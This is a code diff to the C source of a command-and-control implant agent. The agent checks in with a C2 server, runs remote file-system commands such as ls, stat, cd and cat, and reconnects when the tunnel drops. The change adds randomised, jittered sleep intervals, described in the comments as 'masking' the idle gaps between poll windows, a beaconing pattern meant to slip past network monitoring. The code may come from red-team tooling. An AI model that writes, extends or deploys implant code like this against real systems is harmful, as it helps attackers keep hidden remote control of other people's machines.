@@ -9,8 +9,8 @@
  * (`ls`/`ls_dir` as CBOR []util.Dentry, `stat` as CBOR util.FileStat, `pwd`,
  * `cd`, `cat`) plus the in-memory file commands, and returns output like the
  * Go agent's NotifyC2. It reconnects with fresh check-ins when the C2 drops the
- * tunnel and sends keepalive hellos so the C2's 10-minute handshake timeout
- * never fires. This is the binary the e2e test drives against the real C2.
+ * tunnel and masks the idle periods between poll windows. This is the binary
+ * the e2e test drives against the real C2.
  *
  * The encrypted CBOR config and the build-wide magic string are rendered at
  * build time by the Go C2 (lib/cagent, compiled via the Makefile's CONFIG_SRC)
@@ -136,6 +136,44 @@ static void agent_sleep(const c2_agent_config *cfg, unsigned secs) {
     exit(0);
   struct timespec ts = {(time_t)secs, 0};
   nanosleep(&ts, NULL);
+}
+
+/* The C agent masks the idle gap between poll windows. The default profile is
+ * 30-60s of masked sleep, matching the shipped C agent config. */
+#define C2_DEFAULT_POLL_INTERVAL 60
+#define C2_DEFAULT_JITTER_PERCENT 50
+#define C2_MAX_POLL_INTERVAL 86400
+
+static unsigned c2_poll_interval_seconds(const c2_agent_config *cfg) {
+  int32_t interval = cfg != NULL ? cfg->poll_interval : 0;
+  if (interval <= 0)
+    interval = C2_DEFAULT_POLL_INTERVAL;
+  if (interval > C2_MAX_POLL_INTERVAL)
+    interval = C2_MAX_POLL_INTERVAL;
+  return (unsigned)interval;
+}
+
+/* Mirror the Go HTTP-poll jitter: sleep in [interval*(1-jitter%), interval]. */
+static unsigned c2_poll_sleep_seconds(const c2_crypto_backend *be,
+                                      const c2_agent_config *cfg) {
+  unsigned interval = c2_poll_interval_seconds(cfg);
+  int32_t jitter = cfg != NULL ? cfg->jitter : 0;
+  if (jitter <= 0)
+    jitter = C2_DEFAULT_JITTER_PERCENT;
+  if (jitter > 100)
+    jitter = 100;
+
+  uint32_t span =
+      (uint32_t)(((uint64_t)interval * (uint32_t)jitter) / 100u);
+  if (span == 0)
+    return interval;
+
+  uint32_t r = 0;
+  if (be == NULL || be->random == NULL ||
+      be->random(be->ctx, (uint8_t *)&r, sizeof r) != 0)
+    r = (uint32_t)time(NULL);
+  unsigned secs = interval - (r % (span + 1));
+  return secs == 0 ? 1 : secs;
 }
 
 static int cmd_eq(c2_str a, const char *b) {
@@ -864,7 +902,7 @@ __attribute__((visibility("default"))) int main(void) {
   for (;;) {
     if ((st = c2_session_checkin(&s, &info)) != C2_OK) {
       TRACE("[agent] checkin failed: %d\n", st);
-      agent_sleep(&cfg, 5);
+      agent_sleep(&cfg, c2_poll_sleep_seconds(be, &cfg));
       continue;
     }
     TRACE("[agent] checkin ok\n");
@@ -875,13 +913,13 @@ __attribute__((visibility("default"))) int main(void) {
     if ((st = c2_session_open_route(&s, cfg.routes.msg, c2_str_lit(""),
                                     &msg_caps, &msg)) != C2_OK) {
       TRACE("[agent] msg route open failed: %d\n", st);
-      agent_sleep(&cfg, 5);
+      agent_sleep(&cfg, c2_poll_sleep_seconds(be, &cfg));
       continue;
     }
     if ((st = c2_session_hello(&s, &msg, 1)) != C2_OK) {
       TRACE("[agent] hello failed: %d\n", st);
       c2_secureconn_close(&msg);
-      agent_sleep(&cfg, 5);
+      agent_sleep(&cfg, c2_poll_sleep_seconds(be, &cfg));
       continue;
     }
     TRACE("[agent] hello sent\n");
@@ -892,9 +930,10 @@ __attribute__((visibility("default"))) int main(void) {
       int is_job = 0;
       if ((st = c2_session_read(&s, &msg, &m, &is_job)) != C2_OK) {
         if (st == C2_ERR_TIMEOUT) {
-          /* Idle long-poll. The C2 drops a tunnel that is silent for 10
-           * minutes, so answer with a keepalive hello (no ECDH). */
-          TRACE("[agent] idle, keepalive\n");
+          /* No work: mask for the configured sleep interval, then keep the
+           * same tunnel alive with a keepalive hello. */
+          TRACE("[agent] idle, masking\n");
+          agent_sleep(&cfg, c2_poll_sleep_seconds(be, &cfg));
           (void)c2_session_hello(&s, &msg, 0);
           continue;
         }
@@ -914,6 +953,6 @@ __attribute__((visibility("default"))) int main(void) {
 
     c2_secureconn_close(&msg);
     TRACE("[agent] tunnel closed, reconnecting\n");
-    agent_sleep(&cfg, 1);
+    agent_sleep(&cfg, c2_poll_sleep_seconds(be, &cfg));
   }
 }
